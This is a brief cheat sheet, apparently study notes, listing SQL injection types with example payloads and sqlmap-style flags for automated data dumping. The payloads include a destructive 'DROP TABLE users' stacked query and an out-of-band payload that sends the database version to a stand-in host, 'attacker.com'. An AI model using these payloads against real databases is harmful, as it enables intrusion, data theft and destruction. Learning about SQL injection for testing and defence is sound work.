# Types
- Boolean-based blind SQL Injection: AND 1=1
- Error-based SQL Injection: AND GTID_SUBSET(@@version,0)
- UNION query-based: UNION ALL SELECT 1,@@version,3
- Stacked queries: ; DROP TABLE users
- Time-based blind SQL Injection: AND 1=IF(2>1,SLEEP(5),0)
- Inline queries: SELECT (SELECT @@version) from
- Out-of-band SQL Injection: LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))

# Commands
-u: Provide URL
--batch: Skip user input
-r: Provide Request
--dump: Get all data 
